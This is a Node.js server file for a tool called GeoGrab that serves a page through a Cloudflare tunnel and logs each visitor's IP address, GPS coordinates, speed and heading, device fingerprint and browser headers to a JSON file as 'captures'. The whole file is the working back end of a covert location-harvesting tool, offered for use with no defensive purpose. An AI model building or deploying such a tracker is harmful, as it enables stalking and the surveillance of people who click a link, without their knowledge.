// server/server.js

const { spawn } = require("child_process");
const chalk = require("chalk");
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = 9999;

/* ===================== UI / BANNER ===================== */
function launchUI() {
  console.clear();

  console.log(
    chalk.cyanBright(`
 ██████╗ ███████╗ ██████╗  ██████╗ ██████╗  █████╗ ██████╗
██╔════╝ ██╔════╝██╔═══██╗██╔════╝ ██╔══██╗██╔══██╗██╔══██╗
██║  ███╗█████╗  ██║   ██║██║  ███╗██████╔╝███████║██████╔╝
██║   ██║██╔══╝  ██║   ██║██║   ██║██╔══██╗██╔══██║██╔══██╗
╚██████╔╝███████╗╚██████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝
 ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝
`)
  );

  console.log(chalk.gray("────────────────────────────────────────"));
  console.log(chalk.whiteBright(" GeoGrab — Personal Geo Intelligence"));
  console.log(chalk.gray("────────────────────────────────────────"));
  console.log(chalk.green(" GitHub : ") + chalk.white("@arghacrypto-99"));
  console.log(chalk.green(" Social : ") + chalk.white("@arghacrypto99"));
  console.log(chalk.gray("────────────────────────────────────────\n"));
}

function startCloudflare(port) {
  console.log(chalk.yellow(" Starting Cloudflare tunnel...\n"));

  const tunnel = spawn(
    "cloudflared",
    ["tunnel", "--url", `http://localhost:${port}`],
    { stdio: ["ignore", "pipe", "pipe"] }
  );

  let printedURL = false;

  const handleOutput = (data) => {
    const text = data.toString();

    // ✅ Extract trycloudflare URL cleanly
    const match = text.match(/https:\/\/[a-z0-9\-]+\.trycloudflare\.com/);
    if (match && !printedURL) {
      printedURL = true;
      console.log(
        chalk.greenBright(" 🌍 Public URL:\n") +
        chalk.whiteBright(` ${match[0]}\n`)
      );
      console.log(chalk.gray(" Listening for captures...\n"));
    }
    // ❌ Ignore everything else
  };

  // cloudflared is dumb and prints INFO/ERR to stderr
  tunnel.stdout.on("data", handleOutput);
  tunnel.stderr.on("data", handleOutput);

  tunnel.on("error", () => {
    console.log(
      chalk.red(" cloudflared not found. Make sure it is installed.")
    );
  });
}

/* ===================== MIDDLEWARE ===================== */
app.use(cors());
app.use(bodyParser.json());
app.use(express.json());
app.use(express.static(path.join(__dirname, "../public")));

/* ===================== DATA STORAGE ===================== */
const DATA_DIR = path.join(__dirname, "data");
const LOG_FILE = path.join(DATA_DIR, "logs.json");

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
if (!fs.existsSync(LOG_FILE)) fs.writeFileSync(LOG_FILE, "[]");

/* ===================== COLLECT ENDPOINT ===================== */
app.post("/collect", (req, res) => {
  try {
    const ip =
      (req.headers["x-forwarded-for"] || "")
        .split(",")[0]
        .trim() ||
      req.socket.remoteAddress ||
      null;

    const headers = {
      ua: req.headers["user-agent"] || null,
      lang: req.headers["accept-language"] || null,
      encoding: req.headers["accept-encoding"] || null,
      referer: req.headers["referer"] || null,
      origin: req.headers["origin"] || null,
      secChUa: req.headers["sec-ch-ua"] || null,
      secPlatform: req.headers["sec-ch-ua-platform"] || null,
      secMobile: req.headers["sec-ch-ua-mobile"] || null
    };

    const body = req.body || {};

    const location =
      typeof body.lat === "number" && typeof body.lon === "number"
        ? {
            lat: body.lat,
            lon: body.lon,
            accuracy: body.acc ?? null,
            altitude: body.alt ?? null,
            heading: body.heading ?? null,
            speed: body.speed ?? null
          }
        : null;

    const device = {
      userAgent: headers.ua,
      platform: body.platform || null,
      vendor: body.vendor || null,
      cores: body.cores || null,
      memory: body.memory || null,
      screen: body.screen || null,
      timezone: body.timezone || null,
      language: body.language || null,
      touch: body.touch || null,
      mobile:
        headers.secMobile === "?1" ||
        /Android|iPhone|iPad/i.test(headers.ua || "")
    };

    const network = {
      ip,
      connectionType: body.connectionType || null,
      downlink: body.downlink || null,
      rtt: body.rtt || null,
      saveData: body.saveData || null
    };

    const entry = {
      time: new Date().toISOString(),
      ip,
      location,
      device,
      network,
      headers
    };

    const logs = JSON.parse(fs.readFileSync(LOG_FILE, "utf8"));
    logs.push(entry);
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));

    console.log(
      chalk.green("📍 New capture:"),
      {
        ip,
        lat: location?.lat,
        lon: location?.lon,
        accuracy: location?.accuracy,
        ua: headers.ua
      }
    );

    res.sendStatus(200);
  } catch (err) {
    console.error(chalk.red("Collect error:"), err);
    res.sendStatus(500);
  }
});

/* ===================== START SERVER ===================== */
launchUI();

app.listen(PORT, () => {
  console.log(
    chalk.greenBright(" GeoGrab running locally → ") +
    chalk.white(`http://localhost:${PORT}\n`)
  );

  startCloudflare(PORT);
});